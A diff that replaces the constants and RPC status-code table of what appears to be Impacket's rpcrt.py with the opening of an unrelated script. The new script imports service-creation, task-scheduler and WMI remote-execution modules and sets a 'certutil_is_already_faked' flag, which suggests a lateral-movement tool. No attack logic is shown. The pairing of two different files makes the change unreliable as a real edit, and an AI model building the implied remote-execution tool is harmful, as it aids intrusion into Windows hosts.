@@ -1,1689 +1,1313 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2022 Fortra. All rights reserved.
+# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
-#
-# Description:
-#   Partial C706.pdf + [MS-RPCE] implementation
-#
-#   Best way to learn how to use these calls is to grab the protocol standard
-#   so you understand what the call does, and then read the test case located
-#   at https://github.com/fortra/impacket/tree/master/tests/SMB_RPC
-#
-# ToDo:
-#   [ ] Take out all the security provider stuff out of here (e.g. RPC_C_AUTHN_WINNT)
-#       and put it elsewhere. This will make the coder cleaner and easier to add
-#       more SSP (e.g. NETLOGON)
-# 
+from __future__ import division
+from __future__ import print_function
 
-import logging
-import socket
+import base64
+import re
+import shutil
 import sys
-from binascii import unhexlify
-from Cryptodome.Cipher import ARC4
+import os
+import cmd
+import argparse
+import time
+import logging
+import ntpath
+import traceback
+from base64 import b64encode
+from binascii import a2b_hex
 
-from impacket import ntlm, LOG
-from impacket.structure import Structure,pack,unpack
-from impacket.krb5 import kerberosv5, gssapi
-from impacket.uuid import uuidtup_to_bin, generate, stringver_to_bin, bin_to_uuidtup
-from impacket.dcerpc.v5.dtypes import UCHAR, ULONG, USHORT
-from impacket.dcerpc.v5.ndr import NDRSTRUCT
-from impacket import hresult_errors
-from threading import Thread
+import requests
+from impacket.dcerpc.v5 import scmr, atsvc, tsch
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.dcerpc.v5.scmr import hROpenSCManagerW, hRCreateServiceW, SERVICE_DEMAND_START, hRCloseServiceHandle, \
+        hRChangeServiceConfigW, hRDeleteService, RQueryServiceConfig2W, DCERPCSessionError, hRStartServiceW
+from impacket.dcerpc.v5.tsch import hSchRpcHighestVersion
+from impacket.examples import logger
+from impacket.examples.utils import parse_target
+from impacket import version, system_errors
+from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
+from impacket.dcerpc.v5.dcom import wmi
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.transport import DCERPCTransportFactory
+from impacket.krb5.keytab import Keytab
+from six import PY2
+from impacket.dcerpc.v5.epm import hept_map
+from impacket.uuid import uuidtup_to_bin
 
-# MS/RPC Constants
-MSRPC_REQUEST   = 0x00
-MSRPC_PING      = 0x01
-MSRPC_RESPONSE  = 0x02
-MSRPC_FAULT     = 0x03
-MSRPC_WORKING   = 0x04
-MSRPC_NOCALL    = 0x05
-MSRPC_REJECT    = 0x06
-MSRPC_ACK       = 0x07
-MSRPC_CL_CANCEL = 0x08
-MSRPC_FACK      = 0x09
-MSRPC_CANCELACK = 0x0A
-MSRPC_BIND      = 0x0B
-MSRPC_BINDACK   = 0x0C
-MSRPC_BINDNAK   = 0x0D
-MSRPC_ALTERCTX  = 0x0E
-MSRPC_ALTERCTX_R= 0x0F
-MSRPC_AUTH3     = 0x10
-MSRPC_SHUTDOWN  = 0x11
-MSRPC_CO_CANCEL = 0x12
-MSRPC_ORPHANED  = 0x13
-MSRPC_RTS       = 0x14
 
-# MS/RPC Packet Flags
-PFC_FIRST_FRAG     = 0x01
-PFC_LAST_FRAG      = 0x02
+import random
+import string
+import errno, os
+certutil_is_already_faked=False
+# Sadly, Python fails to provide the following magic number for us.
+ERROR_INVALID_NAME = 123
+def is_pathname_valid(pathname: str) -> bool:
+        '''
+        `True` if the passed pathname is a valid pathname for the current OS;
+        `False` otherwise.
+        '''
+        # If this pathname is either not a string or is but is empty, this pathname
+        # is invalid.
+        try:
+                if not isinstance(pathname, str) or not pathname:
+                        return False
 
-# For PDU types bind, bind_ack, alter_context, and
-# alter_context_resp, this flag MUST be interpreted as PFC_SUPPORT_HEADER_SIGN
-MSRPC_SUPPORT_SIGN  = 0x04
+                # Strip this pathname's Windows-specific drive specifier (e.g., `C:\`)
+                # if any. Since Windows prohibits path components from containing `:`
+                # characters, failing to strip this `:`-suffixed prefix would
+                # erroneously invalidate all valid absolute Windows pathnames.
+                _, pathname = os.path.splitdrive(pathname)
 
-#For the
-#remaining PDU types, this flag MUST be interpreted as PFC_PENDING_CANCEL.
-MSRPC_PENDING_CANCEL= 0x04
+                # Directory guaranteed to exist. If the current OS is Windows, this is
+                # the drive to which Windows was installed (e.g., the "%HOMEDRIVE%"
+                # environment variable); else, the typical root directory.
+                root_dirname = os.environ.get('HOMEDRIVE', 'C:') \
+                        if sys.platform == 'win32' else os.path.sep
+                assert os.path.isdir(root_dirname)   # ...Murphy and her ironclad Law
 
-PFC_RESERVED_1      = 0x08
-PFC_CONC_MPX        = 0x10
-PFC_DID_NOT_EXECUTE = 0x20
-PFC_MAYBE           = 0x40
-PFC_OBJECT_UUID     = 0x80
+                # Append a path separator to this directory if needed.
+                root_dirname = root_dirname.rstrip(os.path.sep) + os.path.sep
 
-# Auth Types - Security Providers
-RPC_C_AUTHN_NONE          = 0x00
-RPC_C_AUTHN_GSS_NEGOTIATE = 0x09
-RPC_C_AUTHN_WINNT         = 0x0A
-RPC_C_AUTHN_GSS_SCHANNEL  = 0x0E
-RPC_C_AUTHN_GSS_KERBEROS  = 0x10
-RPC_C_AUTHN_NETLOGON      = 0x44
-RPC_C_AUTHN_DEFAULT       = 0xFF
-
-# Auth Levels
-RPC_C_AUTHN_LEVEL_NONE          = 1
-RPC_C_AUTHN_LEVEL_CONNECT       = 2
-RPC_C_AUTHN_LEVEL_CALL          = 3
-RPC_C_AUTHN_LEVEL_PKT           = 4
-RPC_C_AUTHN_LEVEL_PKT_INTEGRITY = 5
-RPC_C_AUTHN_LEVEL_PKT_PRIVACY   = 6
-
-#Reasons for rejection of a context element, included in bind_ack result reason
-rpc_provider_reason = {
-    0       : 'reason_not_specified',
-    1       : 'abstract_syntax_not_supported',
-    2       : 'proposed_transfer_syntaxes_not_supported',
-    3       : 'local_limit_exceeded',
-    4       : 'protocol_version_not_specified',
-    8       : 'authentication_type_not_recognized',
-    9       : 'invalid_checksum'
-}
-
-MSRPC_CONT_RESULT_ACCEPT = 0
-MSRPC_CONT_RESULT_USER_REJECT = 1
-MSRPC_CONT_RESULT_PROV_REJECT = 2
-
-#Results of a presentation context negotiation
-rpc_cont_def_result = {
-    0       : 'acceptance',
-    1       : 'user_rejection',
-    2       : 'provider_rejection'
-}
-
-#status codes, references:
-#https://docs.microsoft.com/windows/desktop/Rpc/rpc-return-values
-#https://msdn.microsoft.com/library/default.asp?url=/library/en-us/randz/protocol/common_return_values.asp
-#winerror.h
-#https://www.opengroup.org/onlinepubs/9629399/apdxn.htm
-
-rpc_status_codes = {
-    0x00000005 : 'rpc_s_access_denied',
-    0x00000008 : 'Authentication type not recognized',
-    0x000006D8 : 'rpc_fault_cant_perform', 
-    0x000006C6 : 'rpc_x_invalid_bound',                # the arrays bound are invalid
-    0x000006E4 : 'rpc_s_cannot_support: The requested operation is not supported.',               # some operation is not supported
-    0x000006F7 : 'rpc_x_bad_stub_data',                # the stub data is invalid, doesn't match with the IDL definition
-    0x1C010001 : 'nca_s_comm_failure',                 # unable to get response from server:
-    0x1C010002 : 'nca_s_op_rng_error',                 # bad operation number in call
-    0x1C010003 : 'nca_s_unk_if',                       # unknown interface
-    0x1C010006 : 'nca_s_wrong_boot_time',              # client passed server wrong server boot time
-    0x1C010009 : 'nca_s_you_crashed',                  # a restarted server called back a client
-    0x1C01000B : 'nca_s_proto_error',                  # someone messed up the protocol
-    0x1C010013 : 'nca_s_out_args_too_big ',            # output args too big
-    0x1C010014 : 'nca_s_server_too_busy',              # server is too busy to handle call
-    0x1C010015 : 'nca_s_fault_string_too_long',        # string argument longer than declared max len
-    0x1C010017 : 'nca_s_unsupported_type ',            # no implementation of generic operation for object
-    0x1C000001 : 'nca_s_fault_int_div_by_zero',
-    0x1C000002 : 'nca_s_fault_addr_error ',
-    0x1C000003 : 'nca_s_fault_fp_div_zero',
-    0x1C000004 : 'nca_s_fault_fp_underflow',
-    0x1C000005 : 'nca_s_fault_fp_overflow',
-    0x1C000006 : 'nca_s_fault_invalid_tag',
-    0x1C000007 : 'nca_s_fault_invalid_bound ',
-    0x1C000008 : 'nca_s_rpc_version_mismatch',
-    0x1C000009 : 'nca_s_unspec_reject ',
-    0x1C00000A : 'nca_s_bad_actid',
-    0x1C00000B : 'nca_s_who_are_you_failed',
-    0x1C00000C : 'nca_s_manager_not_entered ',
-    0x1C00000D : 'nca_s_fault_cancel',
-    0x1C00000E : 'nca_s_fault_ill_inst',
-    0x1C00000F : 'nca_s_fault_fp_error',
-    0x1C000010 : 'nca_s_fault_int_overflow',
-    0x1C000012 : 'nca_s_fault_unspec',
-    0x1C000013 : 'nca_s_fault_remote_comm_failure ',
-    0x1C000014 : 'nca_s_fault_pipe_empty ',
-    0x1C000015 : 'nca_s_fault_pipe_closed',
-    0x1C000016 : 'nca_s_fault_pipe_order ',
-    0x1C000017 : 'nca_s_fault_pipe_discipline',
-    0x1C000018 : 'nca_s_fault_pipe_comm_error',
-    0x1C000019 : 'nca_s_fault_pipe_memory',
-    0x1C00001A : 'nca_s_fault_context_mismatch ',
-    0x1C00001B : 'nca_s_fault_remote_no_memory ',
-    0x1C00001C : 'nca_s_invalid_pres_context_id',
-    0x1C00001D : 'nca_s_unsupported_authn_level',
-    0x1C00001F : 'nca_s_invalid_checksum ',
-    0x1C000020 : 'nca_s_invalid_crc',
-    0x1C000021 : 'nca_s_fault_user_defined',
-    0x1C000022 : 'nca_s_fault_tx_open_failed',
-    0x1C000023 : 'nca_s_fault_codeset_conv_error',
-    0x1C000024 : 'nca_s_fault_object_not_found ',
-    0x1C000025 : 'nca_s_fault_no_client_stub',
-    0x16c9a000 : "rpc_s_mod",
-    0x16c9a001 : "rpc_s_op_rng_error",
-    0x16c9a002 : "rpc_s_cant_create_socket",
-    0x16c9a003 : "rpc_s_cant_bind_socket",
-    0x16c9a004 : "rpc_s_not_in_call",
-    0x16c9a005 : "rpc_s_no_port",
-    0x16c9a006 : "rpc_s_wrong_boot_time",
-    0x16c9a007 : "rpc_s_too_many_sockets",
-    0x16c9a008 : "rpc_s_illegal_register",
-    0x16c9a009 : "rpc_s_cant_recv",
-    0x16c9a00a : "rpc_s_bad_pkt",
-    0x16c9a00b : "rpc_s_unbound_handle",
-    0x16c9a00c : "rpc_s_addr_in_use",
-    0x16c9a00d : "rpc_s_in_args_too_big",
-    0x16c9a00e : "rpc_s_string_too_long",
-    0x16c9a00f : "rpc_s_too_many_objects",
-    0x16c9a010 : "rpc_s_binding_has_no_auth",
-    0x16c9a011 : "rpc_s_unknown_authn_service",
-    0x16c9a012 : "rpc_s_no_memory",
-    0x16c9a013 : "rpc_s_cant_nmalloc",
-    0x16c9a014 : "rpc_s_call_faulted",
-    0x16c9a015 : "rpc_s_call_failed",
-    0x16c9a016 : "rpc_s_comm_failure",
-    0x16c9a017 : "rpc_s_rpcd_comm_failure",
-    0x16c9a018 : "rpc_s_illegal_family_rebind",
-    0x16c9a019 : "rpc_s_invalid_handle",
-    0x16c9a01a : "rpc_s_coding_error",
-    0x16c9a01b : "rpc_s_object_not_found",
-    0x16c9a01c : "rpc_s_cthread_not_found",
-    0x16c9a01d : "rpc_s_invalid_binding",
-    0x16c9a01e : "rpc_s_already_registered",
-    0x16c9a01f : "rpc_s_endpoint_not_found",
-    0x16c9a020 : "rpc_s_invalid_rpc_protseq",
-    0x16c9a021 : "rpc_s_desc_not_registered",
-    0x16c9a022 : "rpc_s_already_listening",
-    0x16c9a023 : "rpc_s_no_protseqs",
-    0x16c9a024 : "rpc_s_no_protseqs_registered",
-    0x16c9a025 : "rpc_s_no_bindings",
-    0x16c9a026 : "rpc_s_max_descs_exceeded",
-    0x16c9a027 : "rpc_s_no_interfaces",
-    0x16c9a028 : "rpc_s_invalid_timeout",
-    0x16c9a029 : "rpc_s_cant_inq_socket",
-    0x16c9a02a : "rpc_s_invalid_naf_id",
-    0x16c9a02b : "rpc_s_inval_net_addr",
-    0x16c9a02c : "rpc_s_unknown_if",
-    0x16c9a02d : "rpc_s_unsupported_type",
-    0x16c9a02e : "rpc_s_invalid_call_opt",
-    0x16c9a02f : "rpc_s_no_fault",
-    0x16c9a030 : "rpc_s_cancel_timeout",
-    0x16c9a031 : "rpc_s_call_cancelled",
-    0x16c9a032 : "rpc_s_invalid_call_handle",
-    0x16c9a033 : "rpc_s_cannot_alloc_assoc",
-    0x16c9a034 : "rpc_s_cannot_connect",
-    0x16c9a035 : "rpc_s_connection_aborted",
-    0x16c9a036 : "rpc_s_connection_closed",
-    0x16c9a037 : "rpc_s_cannot_accept",
-    0x16c9a038 : "rpc_s_assoc_grp_not_found",
-    0x16c9a039 : "rpc_s_stub_interface_error",
-    0x16c9a03a : "rpc_s_invalid_object",
-    0x16c9a03b : "rpc_s_invalid_type",
-    0x16c9a03c : "rpc_s_invalid_if_opnum",
-    0x16c9a03d : "rpc_s_different_server_instance",
-    0x16c9a03e : "rpc_s_protocol_error",
-    0x16c9a03f : "rpc_s_cant_recvmsg",
-    0x16c9a040 : "rpc_s_invalid_string_binding",
-    0x16c9a041 : "rpc_s_connect_timed_out",
-    0x16c9a042 : "rpc_s_connect_rejected",
-    0x16c9a043 : "rpc_s_network_unreachable",
-    0x16c9a044 : "rpc_s_connect_no_resources",
-    0x16c9a045 : "rpc_s_rem_network_shutdown",
-    0x16c9a046 : "rpc_s_too_many_rem_connects",
-    0x16c9a047 : "rpc_s_no_rem_endpoint",
-    0x16c9a048 : "rpc_s_rem_host_down",
-    0x16c9a049 : "rpc_s_host_unreachable",
-    0x16c9a04a : "rpc_s_access_control_info_inv",
-    0x16c9a04b : "rpc_s_loc_connect_aborted",
-    0x16c9a04c : "rpc_s_connect_closed_by_rem",
-    0x16c9a04d : "rpc_s_rem_host_crashed",
-    0x16c9a04e : "rpc_s_invalid_endpoint_format",
-    0x16c9a04f : "rpc_s_unknown_status_code",
-    0x16c9a050 : "rpc_s_unknown_mgr_type",
-    0x16c9a051 : "rpc_s_assoc_creation_failed",
-    0x16c9a052 : "rpc_s_assoc_grp_max_exceeded",
-    0x16c9a053 : "rpc_s_assoc_grp_alloc_failed",
-    0x16c9a054 : "rpc_s_sm_invalid_state",
-    0x16c9a055 : "rpc_s_assoc_req_rejected",
-    0x16c9a056 : "rpc_s_assoc_shutdown",
-    0x16c9a057 : "rpc_s_tsyntaxes_unsupported",
-    0x16c9a058 : "rpc_s_context_id_not_found",
-    0x16c9a059 : "rpc_s_cant_listen_socket",
-    0x16c9a05a : "rpc_s_no_addrs",
-    0x16c9a05b : "rpc_s_cant_getpeername",
-    0x16c9a05c : "rpc_s_cant_get_if_id",
-    0x16c9a05d : "rpc_s_protseq_not_supported",
-    0x16c9a05e : "rpc_s_call_orphaned",
-    0x16c9a05f : "rpc_s_who_are_you_failed",
-    0x16c9a060 : "rpc_s_unknown_reject",
-    0x16c9a061 : "rpc_s_type_already_registered",
-    0x16c9a062 : "rpc_s_stop_listening_disabled",
-    0x16c9a063 : "rpc_s_invalid_arg",
-    0x16c9a064 : "rpc_s_not_supported",
-    0x16c9a065 : "rpc_s_wrong_kind_of_binding",
-    0x16c9a066 : "rpc_s_authn_authz_mismatch",
-    0x16c9a067 : "rpc_s_call_queued",
-    0x16c9a068 : "rpc_s_cannot_set_nodelay",
-    0x16c9a069 : "rpc_s_not_rpc_tower",
-    0x16c9a06a : "rpc_s_invalid_rpc_protid",
-    0x16c9a06b : "rpc_s_invalid_rpc_floor",
-    0x16c9a06c : "rpc_s_call_timeout",
-    0x16c9a06d : "rpc_s_mgmt_op_disallowed",
-    0x16c9a06e : "rpc_s_manager_not_entered",
-    0x16c9a06f : "rpc_s_calls_too_large_for_wk_ep",
-    0x16c9a070 : "rpc_s_server_too_busy",
-    0x16c9a071 : "rpc_s_prot_version_mismatch",
-    0x16c9a072 : "rpc_s_rpc_prot_version_mismatch",
-    0x16c9a073 : "rpc_s_ss_no_import_cursor",
-    0x16c9a074 : "rpc_s_fault_addr_error",
-    0x16c9a075 : "rpc_s_fault_context_mismatch",
-    0x16c9a076 : "rpc_s_fault_fp_div_by_zero",
-    0x16c9a077 : "rpc_s_fault_fp_error",
-    0x16c9a078 : "rpc_s_fault_fp_overflow",
-    0x16c9a079 : "rpc_s_fault_fp_underflow",
-    0x16c9a07a : "rpc_s_fault_ill_inst",
-    0x16c9a07b : "rpc_s_fault_int_div_by_zero",
-    0x16c9a07c : "rpc_s_fault_int_overflow",
-    0x16c9a07d : "rpc_s_fault_invalid_bound",
-    0x16c9a07e : "rpc_s_fault_invalid_tag",
-    0x16c9a07f : "rpc_s_fault_pipe_closed",
-    0x16c9a080 : "rpc_s_fault_pipe_comm_error",
-    0x16c9a081 : "rpc_s_fault_pipe_discipline",
-    0x16c9a082 : "rpc_s_fault_pipe_empty",
-    0x16c9a083 : "rpc_s_fault_pipe_memory",
-    0x16c9a084 : "rpc_s_fault_pipe_order",
-    0x16c9a085 : "rpc_s_fault_remote_comm_failure",
-    0x16c9a086 : "rpc_s_fault_remote_no_memory",
-    0x16c9a087 : "rpc_s_fault_unspec",
-    0x16c9a088 : "uuid_s_bad_version",
-    0x16c9a089 : "uuid_s_socket_failure",
-    0x16c9a08a : "uuid_s_getconf_failure",
-    0x16c9a08b : "uuid_s_no_address",
-    0x16c9a08c : "uuid_s_overrun",
-    0x16c9a08d : "uuid_s_internal_error",
-    0x16c9a08e : "uuid_s_coding_error",
-    0x16c9a08f : "uuid_s_invalid_string_uuid",
-    0x16c9a090 : "uuid_s_no_memory",
-    0x16c9a091 : "rpc_s_no_more_entries",
-    0x16c9a092 : "rpc_s_unknown_ns_error",
-    0x16c9a093 : "rpc_s_name_service_unavailable",
-    0x16c9a094 : "rpc_s_incomplete_name",
-    0x16c9a095 : "rpc_s_group_not_found",
-    0x16c9a096 : "rpc_s_invalid_name_syntax",
-    0x16c9a097 : "rpc_s_no_more_members",
-    0x16c9a098 : "rpc_s_no_more_interfaces",
-    0x16c9a099 : "rpc_s_invalid_name_service",
-    0x16c9a09a : "rpc_s_no_name_mapping",
-    0x16c9a09b : "rpc_s_profile_not_found",
-    0x16c9a09c : "rpc_s_not_found",
-    0x16c9a09d : "rpc_s_no_updates",
-    0x16c9a09e : "rpc_s_update_failed",
-    0x16c9a09f : "rpc_s_no_match_exported",
-    0x16c9a0a0 : "rpc_s_entry_not_found",
-    0x16c9a0a1 : "rpc_s_invalid_inquiry_context",
-    0x16c9a0a2 : "rpc_s_interface_not_found",
-    0x16c9a0a3 : "rpc_s_group_member_not_found",
-    0x16c9a0a4 : "rpc_s_entry_already_exists",
-    0x16c9a0a5 : "rpc_s_nsinit_failure",
-    0x16c9a0a6 : "rpc_s_unsupported_name_syntax",
-    0x16c9a0a7 : "rpc_s_no_more_elements",
-    0x16c9a0a8 : "rpc_s_no_ns_permission",
-    0x16c9a0a9 : "rpc_s_invalid_inquiry_type",
-    0x16c9a0aa : "rpc_s_profile_element_not_found",
-    0x16c9a0ab : "rpc_s_profile_element_replaced",
-    0x16c9a0ac : "rpc_s_import_already_done",
-    0x16c9a0ad : "rpc_s_database_busy",
-    0x16c9a0ae : "rpc_s_invalid_import_context",
-    0x16c9a0af : "rpc_s_uuid_set_not_found",
-    0x16c9a0b0 : "rpc_s_uuid_member_not_found",
-    0x16c9a0b1 : "rpc_s_no_interfaces_exported",
-    0x16c9a0b2 : "rpc_s_tower_set_not_found",
-    0x16c9a0b3 : "rpc_s_tower_member_not_found",
-    0x16c9a0b4 : "rpc_s_obj_uuid_not_found",
-    0x16c9a0b5 : "rpc_s_no_more_bindings",
-    0x16c9a0b6 : "rpc_s_invalid_priority",
-    0x16c9a0b7 : "rpc_s_not_rpc_entry",
-    0x16c9a0b8 : "rpc_s_invalid_lookup_context",
-    0x16c9a0b9 : "rpc_s_binding_vector_full",
-    0x16c9a0ba : "rpc_s_cycle_detected",
-    0x16c9a0bb : "rpc_s_nothing_to_export",
-    0x16c9a0bc : "rpc_s_nothing_to_unexport",
-    0x16c9a0bd : "rpc_s_invalid_vers_option",
-    0x16c9a0be : "rpc_s_no_rpc_data",
-    0x16c9a0bf : "rpc_s_mbr_picked",
-    0x16c9a0c0 : "rpc_s_not_all_objs_unexported",
-    0x16c9a0c1 : "rpc_s_no_entry_name",
-    0x16c9a0c2 : "rpc_s_priority_group_done",
-    0x16c9a0c3 : "rpc_s_partial_results",
-    0x16c9a0c4 : "rpc_s_no_env_setup",
-    0x16c9a0c5 : "twr_s_unknown_sa",
-    0x16c9a0c6 : "twr_s_unknown_tower",
-    0x16c9a0c7 : "twr_s_not_implemented",
-    0x16c9a0c8 : "rpc_s_max_calls_too_small",
-    0x16c9a0c9 : "rpc_s_cthread_create_failed",
-    0x16c9a0ca : "rpc_s_cthread_pool_exists",
-    0x16c9a0cb : "rpc_s_cthread_no_such_pool",
-    0x16c9a0cc : "rpc_s_cthread_invoke_disabled",
-    0x16c9a0cd : "ept_s_cant_perform_op",
-    0x16c9a0ce : "ept_s_no_memory",
-    0x16c9a0cf : "ept_s_database_invalid",
-    0x16c9a0d0 : "ept_s_cant_create",
-    0x16c9a0d1 : "ept_s_cant_access",
-    0x16c9a0d2 : "ept_s_database_already_open",
-    0x16c9a0d3 : "ept_s_invalid_entry",
-    0x16c9a0d4 : "ept_s_update_failed",
-    0x16c9a0d5 : "ept_s_invalid_context",
-    0x16c9a0d6 : "ept_s_not_registered",
-    0x16c9a0d7 : "ept_s_server_unavailable",
-    0x16c9a0d8 : "rpc_s_underspecified_name",
-    0x16c9a0d9 : "rpc_s_invalid_ns_handle",
-    0x16c9a0da : "rpc_s_unknown_error",
-    0x16c9a0db : "rpc_s_ss_char_trans_open_fail",
-    0x16c9a0dc : "rpc_s_ss_char_trans_short_file",
-    0x16c9a0dd : "rpc_s_ss_context_damaged",
-    0x16c9a0de : "rpc_s_ss_in_null_context",
-    0x16c9a0df : "rpc_s_socket_failure",
-    0x16c9a0e0 : "rpc_s_unsupported_protect_level",
-    0x16c9a0e1 : "rpc_s_invalid_checksum",
-    0x16c9a0e2 : "rpc_s_invalid_credentials",
-    0x16c9a0e3 : "rpc_s_credentials_too_large",
-    0x16c9a0e4 : "rpc_s_call_id_not_found",
-    0x16c9a0e5 : "rpc_s_key_id_not_found",
-    0x16c9a0e6 : "rpc_s_auth_bad_integrity",
-    0x16c9a0e7 : "rpc_s_auth_tkt_expired",
-    0x16c9a0e8 : "rpc_s_auth_tkt_nyv",
-    0x16c9a0e9 : "rpc_s_auth_repeat",
-    0x16c9a0ea : "rpc_s_auth_not_us",
-    0x16c9a0eb : "rpc_s_auth_badmatch",
-    0x16c9a0ec : "rpc_s_auth_skew",
-    0x16c9a0ed : "rpc_s_auth_badaddr",
-    0x16c9a0ee : "rpc_s_auth_badversion",
-    0x16c9a0ef : "rpc_s_auth_msg_type",
-    0x16c9a0f0 : "rpc_s_auth_modified",
-    0x16c9a0f1 : "rpc_s_auth_badorder",
-    0x16c9a0f2 : "rpc_s_auth_badkeyver",
-    0x16c9a0f3 : "rpc_s_auth_nokey",
-    0x16c9a0f4 : "rpc_s_auth_mut_fail",
-    0x16c9a0f5 : "rpc_s_auth_baddirection",
-    0x16c9a0f6 : "rpc_s_auth_method",
-    0x16c9a0f7 : "rpc_s_auth_badseq",
-    0x16c9a0f8 : "rpc_s_auth_inapp_cksum",
-    0x16c9a0f9 : "rpc_s_auth_field_toolong",
-    0x16c9a0fa : "rpc_s_invalid_crc",
-    0x16c9a0fb : "rpc_s_binding_incomplete",
-    0x16c9a0fc : "rpc_s_key_func_not_allowed",
-    0x16c9a0fd : "rpc_s_unknown_stub_rtl_if_vers",
-    0x16c9a0fe : "rpc_s_unknown_ifspec_vers",
-    0x16c9a0ff : "rpc_s_proto_unsupp_by_auth",
-    0x16c9a100 : "rpc_s_authn_challenge_malformed",
-    0x16c9a101 : "rpc_s_protect_level_mismatch",
-    0x16c9a102 : "rpc_s_no_mepv",
-    0x16c9a103 : "rpc_s_stub_protocol_error",
-    0x16c9a104 : "rpc_s_class_version_mismatch",
-    0x16c9a105 : "rpc_s_helper_not_running",
-    0x16c9a106 : "rpc_s_helper_short_read",
-    0x16c9a107 : "rpc_s_helper_catatonic",
-    0x16c9a108 : "rpc_s_helper_aborted",
-    0x16c9a109 : "rpc_s_not_in_kernel",
-    0x16c9a10a : "rpc_s_helper_wrong_user",
-    0x16c9a10b : "rpc_s_helper_overflow",
-    0x16c9a10c : "rpc_s_dg_need_way_auth",
-    0x16c9a10d : "rpc_s_unsupported_auth_subtype",
-    0x16c9a10e : "rpc_s_wrong_pickle_type",
-    0x16c9a10f : "rpc_s_not_listening",
-    0x16c9a110 : "rpc_s_ss_bad_buffer",
-    0x16c9a111 : "rpc_s_ss_bad_es_action",
-    0x16c9a112 : "rpc_s_ss_wrong_es_version",
-    0x16c9a113 : "rpc_s_fault_user_defined",
-    0x16c9a114 : "rpc_s_ss_incompatible_codesets",
-    0x16c9a115 : "rpc_s_tx_not_in_transaction",
-    0x16c9a116 : "rpc_s_tx_open_failed",
-    0x16c9a117 : "rpc_s_partial_credentials",
-    0x16c9a118 : "rpc_s_ss_invalid_codeset_tag",
-    0x16c9a119 : "rpc_s_mgmt_bad_type",
-    0x16c9a11a : "rpc_s_ss_invalid_char_input",
-    0x16c9a11b : "rpc_s_ss_short_conv_buffer",
-    0x16c9a11c : "rpc_s_ss_iconv_error",
-    0x16c9a11d : "rpc_s_ss_no_compat_codeset",
-    0x16c9a11e : "rpc_s_ss_no_compat_charsets",
-    0x16c9a11f : "dce_cs_c_ok",
-    0x16c9a120 : "dce_cs_c_unknown",
-    0x16c9a121 : "dce_cs_c_notfound",
-    0x16c9a122 : "dce_cs_c_cannot_open_file",
-    0x16c9a123 : "dce_cs_c_cannot_read_file",
-    0x16c9a124 : "dce_cs_c_cannot_allocate_memory",
-    0x16c9a125 : "rpc_s_ss_cleanup_failed",
-    0x16c9a126 : "rpc_svc_desc_general",
-    0x16c9a127 : "rpc_svc_desc_mutex",
-    0x16c9a128 : "rpc_svc_desc_xmit",
-    0x16c9a129 : "rpc_svc_desc_recv",
-    0x16c9a12a : "rpc_svc_desc_dg_state",
-    0x16c9a12b : "rpc_svc_desc_cancel",
-    0x16c9a12c : "rpc_svc_desc_orphan",
-    0x16c9a12d : "rpc_svc_desc_cn_state",
-    0x16c9a12e : "rpc_svc_desc_cn_pkt",
-    0x16c9a12f : "rpc_svc_desc_pkt_quotas",
-    0x16c9a130 : "rpc_svc_desc_auth",
-    0x16c9a131 : "rpc_svc_desc_source",
-    0x16c9a132 : "rpc_svc_desc_stats",
-    0x16c9a133 : "rpc_svc_desc_mem",
-    0x16c9a134 : "rpc_svc_desc_mem_type",
-    0x16c9a135 : "rpc_svc_desc_dg_pktlog",
-    0x16c9a136 : "rpc_svc_desc_thread_id",
-    0x16c9a137 : "rpc_svc_desc_timestamp",
-    0x16c9a138 : "rpc_svc_desc_cn_errors",
-    0x16c9a139 : "rpc_svc_desc_conv_thread",
-    0x16c9a13a : "rpc_svc_desc_pid",
-    0x16c9a13b : "rpc_svc_desc_atfork",
-    0x16c9a13c : "rpc_svc_desc_cma_thread",
-    0x16c9a13d : "rpc_svc_desc_inherit",
-    0x16c9a13e : "rpc_svc_desc_dg_sockets",
-    0x16c9a13f : "rpc_svc_desc_timer",
-    0x16c9a140 : "rpc_svc_desc_threads",
-    0x16c9a141 : "rpc_svc_desc_server_call",
-    0x16c9a142 : "rpc_svc_desc_nsi",
-    0x16c9a143 : "rpc_svc_desc_dg_pkt",
-    0x16c9a144 : "rpc_m_cn_ill_state_trans_sa",
-    0x16c9a145 : "rpc_m_cn_ill_state_trans_ca",
-    0x16c9a146 : "rpc_m_cn_ill_state_trans_sg",
-    0x16c9a147 : "rpc_m_cn_ill_state_trans_cg",
-    0x16c9a148 : "rpc_m_cn_ill_state_trans_sr",
-    0x16c9a149 : "rpc_m_cn_ill_state_trans_cr",
-    0x16c9a14a : "rpc_m_bad_pkt_type",
-    0x16c9a14b : "rpc_m_prot_mismatch",
-    0x16c9a14c : "rpc_m_frag_toobig",
-    0x16c9a14d : "rpc_m_unsupp_stub_rtl_if",
-    0x16c9a14e : "rpc_m_unhandled_callstate",
-    0x16c9a14f : "rpc_m_call_failed",
-    0x16c9a150 : "rpc_m_call_failed_no_status",
-    0x16c9a151 : "rpc_m_call_failed_errno",
-    0x16c9a152 : "rpc_m_call_failed_s",
-    0x16c9a153 : "rpc_m_call_failed_c",
-    0x16c9a154 : "rpc_m_errmsg_toobig",
-    0x16c9a155 : "rpc_m_invalid_srchattr",
-    0x16c9a156 : "rpc_m_nts_not_found",
-    0x16c9a157 : "rpc_m_invalid_accbytcnt",
-    0x16c9a158 : "rpc_m_pre_v2_ifspec",
-    0x16c9a159 : "rpc_m_unk_ifspec",
-    0x16c9a15a : "rpc_m_recvbuf_toosmall",
-    0x16c9a15b : "rpc_m_unalign_authtrl",
-    0x16c9a15c : "rpc_m_unexpected_exc",
-    0x16c9a15d : "rpc_m_no_stub_data",
-    0x16c9a15e : "rpc_m_eventlist_full",
-    0x16c9a15f : "rpc_m_unk_sock_type",
-    0x16c9a160 : "rpc_m_unimp_call",
-    0x16c9a161 : "rpc_m_invalid_seqnum",
-    0x16c9a162 : "rpc_m_cant_create_uuid",
-    0x16c9a163 : "rpc_m_pre_v2_ss",
-    0x16c9a164 : "rpc_m_dgpkt_pool_corrupt",
